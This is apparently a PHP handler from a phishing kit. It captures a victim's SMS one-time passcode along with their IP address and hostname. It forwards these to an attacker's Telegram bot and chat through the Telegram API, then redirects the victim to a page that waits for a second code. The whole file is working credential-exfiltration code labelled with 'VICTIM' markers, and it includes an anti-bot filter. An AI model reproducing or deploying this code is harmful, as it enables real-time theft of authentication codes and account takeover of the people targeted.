<?php

include("../edit.php");
include '../CRfiles/PHP/botfucker.php'; 
include '../CRfiles/PHP/sys.php';
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['MrCorona'] == 'SpoW')){
  $hostname = gethostbyaddr($ip);
    $coronamsg .= "💰 S M S 1 - V I C T I M 💰\n";
    $coronamsg .= "🔑 SMS 1 = ".$_POST['otpCorona']."\n";
    $coronamsg .= "👀 IP LOOKUP INFORMATION 👀\n";
    $coronamsg .= "👀 IP ADDRESS = $ip\n";
    $coronamsg .= "     🦸‍♂️  HERO  🦸‍♂️    \n"; 
    $token = "$coronatoken";
    $data = [
    'text' => $coronamsg,
    'chat_id' => $coronachat,
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    $infos = "[⚠️] SMS PAGE 2 ON WAY 10 sec";
	 $token = "$coronatoken";
    $data = [
    'text' => $infos,
    'chat_id' => $coronachat,
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    header("Location: ../wa_it.php");}
    else{
      header("Location: ../index.php");}


?>